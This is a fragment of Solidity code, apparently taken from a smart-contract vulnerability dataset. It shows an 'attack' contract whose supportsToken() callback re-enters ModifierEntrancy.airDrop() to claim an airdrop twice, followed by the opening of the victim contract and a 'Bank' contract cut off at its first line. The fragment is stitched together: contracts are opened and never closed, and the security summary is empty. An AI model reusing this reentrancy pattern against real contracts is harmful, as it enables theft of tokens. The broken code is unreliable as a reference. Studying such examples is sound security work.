// ===== SECURITY SUMMARY =====
// =============================


// Contract prelude

contract attack{
    bool hasBeenCalled;

// [context] supportsToken

    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }

// Contract prelude

contract ModifierEntrancy {
  mapping (address => uint) public tokenBalance;
  string constant name = "Nu Token";

// Contract prelude

contract Bank{